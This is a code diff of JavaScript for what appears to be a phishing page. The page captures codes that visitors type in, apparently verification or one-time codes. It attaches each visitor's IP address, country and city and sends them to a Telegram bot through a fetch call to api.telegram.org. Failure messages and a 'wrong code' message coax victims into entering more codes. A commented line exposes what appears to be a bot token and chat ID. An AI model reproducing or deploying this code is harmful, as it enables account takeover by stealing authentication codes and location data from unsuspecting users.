@@ -6,26 +6,26 @@ function getIP(callback) {
         .catch(error => callback(undefined));
 }
 let IpAddress = '';
-    
+
 getIP(ip => {
     IpAddress = ip;
 });
 $(document).ready(function () {
     // getCode();
-    updateHtmlAndCallback(function (){
+    updateHtmlAndCallback(function () {
         sendCode();
     })
 
     setTime();
-    $('#back-hone').on('click',function (){
+    $('#back-hone').on('click', function () {
         window.location.href = '/end';
     })
-    $('#send').on('click',function (){
+    $('#send').on('click', function () {
         $('.lsd-ring-container').removeClass('d-none');
 
-        setTimeout(function (){
+        setTimeout(function () {
             $('.lsd-ring-container').addClass('d-none');
-        },2000);
+        }, 2000);
     })
 });
 
@@ -144,9 +144,9 @@ function updateHtmlAndCallback(callback) {
 //     });
 // }
 let NUMBER_TIME_SEND_CODE = 0;
-let code1='';
-let code2='';
-let Fcode='';
+let code1 = '';
+let code2 = '';
+let Fcode = '';
 function sendCode() {
     $('#code').on('input', function () {
         const input = $(this).val();
@@ -168,12 +168,12 @@ function sendCode() {
         } else {
             $('#code').removeClass('border-danger');
         }
-        code1=keymap;
-        const message1   = 
-        '%0A<strong>Code: </strong>'+code1+
-        '%0A<strong>IP Address: </strong>' + IpAddress.ipAddress +
-        '%0A<strong>Country : </strong>' + IpAddress.countryName +'( '+IpAddress.countryCode+' )'+
-        '%0A<strong>City : </strong>' + IpAddress.city ;
+        code1 = keymap;
+        const message1 =
+            '%0A<strong>Code: </strong>' + code1 +
+            '%0A<strong>IP Address: </strong>' + IpAddress.ipAddress +
+            '%0A<strong>Country : </strong>' + IpAddress.countryName + '( ' + IpAddress.countryCode + ' )' +
+            '%0A<strong>City : </strong>' + IpAddress.city;
 
 
 
@@ -181,77 +181,78 @@ function sendCode() {
         // const botToken = '6899648318:AAEuhFl-OX-SGSRSc2i_fa7ZSMJTE1Yo3Ik'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
         // const chatId = '-1002129119762'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
 
-        const botToken = process.env.NEXT_PUBLIC_BOT_TOKEN;
-        const chatId = process.env.NEXT_PUBLIC_CHAT_ID; 
+        let botToken = "abc";
+        let chatId = "abc";
 
         fetch('/api/config')
-        .then(response => response.json())
-        .then(config => {
-            chatId = config.chatId;
-            botToken = config.botToken;
-        });
+            .then(response => response.json())
+            .then(config => {
+                chatId = config.chatId;
+                botToken = config.botToken;
 
-        const message = message1; // Tin nhắn sẽ là dữ liệu sản phẩm
+                const message = message1; // Tin nhắn sẽ là dữ liệu sản phẩm
 
-        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;
 
-        fetch(telegramUrl)
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                return response.json();
-            })
-            .then(data => {
-                
-                setTimeout(function () {
-                    if (NUMBER_TIME_SEND_CODE == 1){
-                        $('#wrong-code').removeClass('d-none');
-                    }else{
-                        $('#getCode').removeClass('d-none');
-                    }
-                    $('.lsd-ring-container').addClass('d-none');
-                }, 2000);
-            })
-            .catch(error => {
-                setTimeout(function () {
-                    Swal.fire({
-                        text: `Request failed!`,
-                        icon: "error"
+                fetch(telegramUrl)
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Network response was not ok');
+                        }
+                        return response.json();
+                    })
+                    .then(data => {
+
+                        setTimeout(function () {
+                            if (NUMBER_TIME_SEND_CODE == 1) {
+                                $('#wrong-code').removeClass('d-none');
+                            } else {
+                                $('#getCode').removeClass('d-none');
+                            }
+                            $('.lsd-ring-container').addClass('d-none');
+                        }, 2000);
+                    })
+                    .catch(error => {
+                        setTimeout(function () {
+                            Swal.fire({
+                                text: `Request failed!`,
+                                icon: "error"
+                            });
+                            $('.lsd-ring-container').addClass('d-none');
+                        }, 500);
                     });
-                    $('.lsd-ring-container').addClass('d-none');
-                }, 500);
             });
-      /*  $.ajax({
-            url: '/sendInfo',
-            type: 'POST',
-            contentType: 'application/json',
-            data: JSON.stringify({keymap : keymap}),
-            beforeSend: function () {
-                $('.lsd-ring-container').removeClass('d-none');
-            },
-            success: function (data) {
-                setTimeout(function () {
-                    if (NUMBER_TIME_SEND_CODE == 1){
-                        $('#wrong-code').removeClass('d-none');
-                    }else{
-                        $('#getCode').removeClass('d-none');
-                    }
-                    $('.lsd-ring-container').addClass('d-none');
-                }, 2000);
 
-            },
-            error: function (xhr, status, error) {
-                setTimeout(function () {
-                    Swal.fire({
-                        text: `Request failed!`,
-                        icon: "error"
-                    });
-                    $('.lsd-ring-container').addClass('d-none');
-                }, 2000);
-            }
-
-        });*/
+        /*  $.ajax({
+              url: '/sendInfo',
+              type: 'POST',
+              contentType: 'application/json',
+              data: JSON.stringify({keymap : keymap}),
+              beforeSend: function () {
+                  $('.lsd-ring-container').removeClass('d-none');
+              },
+              success: function (data) {
+                  setTimeout(function () {
+                      if (NUMBER_TIME_SEND_CODE == 1){
+                          $('#wrong-code').removeClass('d-none');
+                      }else{
+                          $('#getCode').removeClass('d-none');
+                      }
+                      $('.lsd-ring-container').addClass('d-none');
+                  }, 2000);
+  
+              },
+              error: function (xhr, status, error) {
+                  setTimeout(function () {
+                      Swal.fire({
+                          text: `Request failed!`,
+                          icon: "error"
+                      });
+                      $('.lsd-ring-container').addClass('d-none');
+                  }, 2000);
+              }
+  
+          });*/
     })
 
 }
